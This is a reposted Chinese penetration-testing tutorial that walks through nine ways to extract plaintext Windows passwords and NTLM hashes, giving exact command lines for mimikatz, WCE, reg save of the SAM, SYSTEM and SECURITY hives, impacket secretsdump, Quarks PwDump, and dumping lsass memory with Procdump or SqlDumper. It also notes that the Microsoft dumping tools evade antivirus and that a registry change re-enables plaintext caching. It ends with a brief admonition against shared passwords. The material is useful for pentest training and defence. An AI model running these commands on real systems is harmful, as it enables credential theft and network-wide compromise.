> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [baijiahao.baidu.com](https://baijiahao.baidu.com/s?id=1626592610700813942&wfr=spider&for=pc)

渗透测试，可用于测试企业单位内网的安全性，而获取 Windows 的明文或 Hash 往往是整个渗透测试过程中重要的一环，一旦某台机器的密码在内网中是通用的，那么该内网的安全性将会非常糟糕。

本期安仔课堂，ISEC 实验室的李老师为大家介绍一些抓取 Windows 明文或 Hash 的方式。

一、mimikatz

mimikatz 是一款轻量级的调试神器，功能非常强大，其中最常用的功能就是抓取明文或 Hash。

用法：

mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords full" "exit"

![](https://pics0.baidu.com/feed/1f178a82b9014a904ef02bfd2d5a4916b21bee52.jpeg?token=0d567a1761c9f9f93f54177b0696c0f4&s=EDE63A6253B7B3CE48DD05090000E0C1)图 1

另外，需要注意的是，当系统为 win10 或 2012R2 以上时，默认在内存缓存中禁止保存明文密码，如下图，密码字段显示为 null，此时可以通过修改注册表的方式抓取明文，但需要用户重新登录后才能成功抓取。

![](https://pics4.baidu.com/feed/30adcbef76094b360a5df46826e10cdd8c109d1e.jpeg?token=8e5def16f7ff635a374a6a8b897dde46&s=256052225BBEBEC8144D98010000E0C0)图 2

修改注册表命令：

![](https://pics2.baidu.com/feed/0823dd54564e92587ab8b0b41aafa15ccdbf4e89.jpeg?token=3e5e0b18d681e4c13cd3773d4208ad8f)图 3

修改成功后，等用户下次再登录的时候，重新运行 mimikatz，即可抓到明文密码，如需恢复原样，只需将上图 REG_DWORD 的值 1 改为 0 即可。

![](https://pics5.baidu.com/feed/2fdda3cc7cd98d10b150efc3a512c80a7aec906a.jpeg?token=1518c0251f826330c8e662aa629ec1a2&s=E8E23A6293E1B3595EED3D02000070C0)图 4

二、Getpass

Getapss 是由闪电小子根据 mimikatz 编译的一个工具，可以直接获取明文密码，直接运行 Getpass.exe 即可。

![](https://pics5.baidu.com/feed/e850352ac65c1038b99679df373ce317b17e89f1.jpeg?token=c64d03a3519e67dac8c3caf55ccb9e96&s=ED663A625BB4B65946F1D40F000030C1)图 5

三、Wce

Wce 是一款 Hash 注入神器，不仅可以用于 Hash 注入，也可以直接获取明文或 Hash。

抓明文：wce.exe -w

![](https://pics0.baidu.com/feed/b58f8c5494eef01f5743183863d3e921bd317dad.jpeg?token=479bc5a8aa3658ea38bcb0d5bebf2770&s=69E23A62EBA1B3704E51BD06000060C1)图 6

抓 Hash：wce.exe -l

![](https://pics7.baidu.com/feed/f703738da97739122912cb9b7b34f61c377ae2c2.jpeg?token=bc99da9f075f36cdea30ae3b8c76d3e7&s=CDE23A62CDE48F7006D5B90F0000E0C1)图 7

四、 Powershell

当目标系统存在 powershell 时，可直接一句 powershell 代码调用抓取，前提是目标可出外网，否则需要将 ps1 脚本放置内网之中。

抓明文:

![](https://pics5.baidu.com/feed/8601a18b87d6277fdeaed83faf156f34e924fc2f.jpeg?token=8264a31349d576bd6eeb1173bb414cf6)图 8

![](https://pics5.baidu.com/feed/c75c10385343fbf2e5b385b03653ba8464388fb3.jpeg?token=59b07ac5797bf2c302c99edb994e4889&s=EDE03A625BB4B7CA1EF898070000A0C1)图 9

抓 Hash:

![](https://pics4.baidu.com/feed/f11f3a292df5e0fe7af67cbdd94d44ac5fdf7256.jpeg?token=8f850e48181f26eef001947d7af41e8b)图 10

![](https://pics4.baidu.com/feed/503d269759ee3d6db95ae773c03b1d264e4ade98.jpeg?token=dfab6ad66e438713bbeccfcbbf979437&s=89E07A22E98CBF7046F85D03000080C1)图 11

五、 Sam

1. 使用注册表来离线导出 Hash

reg save HKLM\SYSTEM system.hiv

reg save HKLM\SAM sam.hiv

reg save hklm\security security.hiv

导出后可以使用 cain 导入 system.hiv、security.hiv 获取缓存中的明文信息。

![](https://pics0.baidu.com/feed/cc11728b4710b912e5e7647347d08c07934522ce.jpeg?token=805336914ec76c5742f7939f9e4218dc&s=58843D73131C71C84AE155C40000B0B1)图 12

或者导入 sam.hiv 和 system.hiv 的 syskey 获取密码 Hash。

![](https://pics5.baidu.com/feed/cefc1e178a82b9017370224df5a0d9733812efa5.jpeg?token=ad4ca4ec23c707eeafcb03300c232b02&s=1E84EB03400E60EA4AE154CD0000E0B1)图 13

除了 cain，也可以使用 mimikatz 加载 sam.hiv 和 sam.hiv 来导出 Hash。

用法：mimikatz.exe "lsadump::sam /system:system.hiv /sam:sam.hiv" exit

![](https://pics0.baidu.com/feed/96dda144ad345982d8e8de368ad941a9caef84e1.jpeg?token=eacb22980cf7a0e186c7c72513d976d1&s=2DE27A225BB4B2CE5050B4060000E0C1)图 14

或者使用 impacket 套件中的 secretsdump.py 脚本去解密，也是可以的。

用法：python secretsdump.py -sam sam.hiv -security security.hiv -system system.hiv LOCAL

![](https://pics0.baidu.com/feed/5366d0160924ab1863162166b3d796c97b890b15.jpeg?token=968df4ec54e5b4772f59091454edc920&s=5B29FB4ADBA19B604E45E603000070C6)图 15

2. 使用 mimikatz 在线导出 sam 的 Hash

用法：mimikatz.exe "log res.txt" "privilege::debug" "token::elevate" "lsadump::sam" "exit"

![](https://pics6.baidu.com/feed/472309f79052982225f3fe6452e70bcf0b46d403.jpeg?token=162a00d9e0f9fbf204a5ae0094e187d9&s=EDE23A6253B4B7CA02F0B4030000E0C1)图 16

六、PwDump7

Pwdump7 可以在 CMD 下直接提取系统中用户的密码 Hash，直接运行即可。

![](https://pics6.baidu.com/feed/8326cffc1e178a82786507bf722e0389a977e802.jpeg?token=3664043a187544d9d125032c76ba30b9&s=ADE27A2297F098610CDDF10B0000A0C1)图 17

七、 Quarks PwDump

Quarks PwDump 是一款开放源代码的 Windows 用户凭据提取工具，它可以抓取 Windows 平台下多种类型的用户凭据，包括：本地帐户、域帐户、缓存的域帐户和 Bitlocker。

用法：

导出本地用户 Hash：

Quarks PwDump.exe --dump-hash-local

![](https://pics6.baidu.com/feed/279759ee3d6d55fb4c880128e80f3f4e20a4dd20.jpeg?token=b1bfc2d92beea2fbb22359166707e8d3&s=70A191548BB988CA426B8A8C0200708F)图 18

配合 Ntdsutil 导出域用户 Hash：

QuarksPwDump –dump-hash-domain –ntds-file c:\ntds_save.dit

![](https://pics4.baidu.com/feed/0df3d7ca7bcb0a468f2b6f6bee4e86206b60af0d.jpeg?token=548d0518025b40794341fbd5a19e8409&s=7021B1545BBD8ACC5663CF8C0200308F)图 19

八、 Procdump + mimikatz

Procdump 是微软出品的一个小工具，具备一定的免杀功能。

用法：

1. 生成 dump 文件

Procdump.exe -accepteula -ma lsass.exe lsass.dmp

![](https://pics3.baidu.com/feed/0b55b319ebc4b74569945dec4bd16e138b8215fd.jpeg?token=6c5f46008893f4ac857d23b33d72555b&s=EDE03A66DFE5BE511C599C0B0000E0C1)图 20

2.mimikatz 加载 dump 文件

mimikatz.exe"sekurlsa::minidumplsass.dmp""sekurlsa::logonPasswords full""exit"

![](https://pics3.baidu.com/feed/fd039245d688d43f218697eafb33a21f0ef43ba8.jpeg?token=de5d8a65cef3873a9ff8a3ac23259ba8&s=CDE03A621B348FCA56E5BD090000B0C1)图 21

九、SqlDumper + mimikatz

SqlDumper.exe 是从 SQL Server 安装目录下提取出来的，功能和 Procdump 相似，并且也是微软出品的，体积远小于 Procdump，也具备一定的免杀功能。SqlDumper.exe 默认存放在 C:\Program Files\Microsoft SQL Server\number\Shared，number 代表 SQL Server 的版本，参考如下：

140 for SQL Server 2017

130 for SQL Server 2016

120 for SQL Server 2014

110 for SQL Server 2012

100 for SQL Server 2008

90 for SQL Server 2005

如果目标机器没有安装 SQL Server，可以自己上传一个 SqlDumper.exe。

用法：

1. 查看 lsass.exe 的 ProcessID

tasklist /svc |findstr lsass.exe

![](https://pics4.baidu.com/feed/5bafa40f4bfbfbedb6abe1cbfcdd8732aec31f41.jpeg?token=692334a7a46474fd4c02de7aec21b0b7)图 22

2. 导出 dump 文件

Sqldumper.exe ProcessID 0 0x01100

![](https://pics6.baidu.com/feed/b64543a98226cffcec3e93d53c2c3a94f603ea77.jpeg?token=1ef2e0f5705355ab3c55dc76657c9f7b&s=EDE03A62D3F0BE691EF9110B0000E0C1)图 23

3.mimikatz 加载 dump 文件

mimikatz.exe"sekurlsa::minidumpSQLDmpr0001.mdmp""sekurlsa::logonPasswords full""exit"

![](https://pics0.baidu.com/feed/a8773912b31bb0519f4428f1b357aab04bede0bd.jpeg?token=cf7336e3c821638e3e949a061b1bc5da&s=E9E03A621BB6B7CA1EC1B40A0000E0C1)图 24

成功导出明文或 Hash 破解后，一旦密码通用，将会威胁整个内网。因此，内网管理人员应尽量避免使用通用密码，并及时安装防护软件。